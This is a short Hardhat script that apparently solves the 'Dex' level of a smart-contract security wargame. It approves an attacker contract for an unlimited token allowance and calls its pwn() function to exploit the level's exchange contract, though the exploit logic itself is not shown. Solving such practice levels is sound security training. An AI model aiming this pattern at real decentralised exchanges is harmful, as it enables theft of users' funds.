import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

const pwn = async () => {
    const signer = await getSigner()
    const hack = await ethers.getContractAt(
        "contracts/Dex.sol:PokeDex",
        ADDRESSES.pokedex,
        signer
    )
    const target = await ethers.getContractAt(
        "contracts/Dex.sol:Dex",
        LEVEL_ADDRESSES.dex,
        signer
    )

    try {
        const approval = await target.approve(hack.address, ethers.constants.MaxUint256)
        const pwn = await hack.pwn()
        await pwn.wait()
    } catch (error: any) {
        console.log(Object.keys(error))
        console.log(error.data)
        console.log("name", error.name)
        console.log("stack", error._stack)
    }
}

pwn()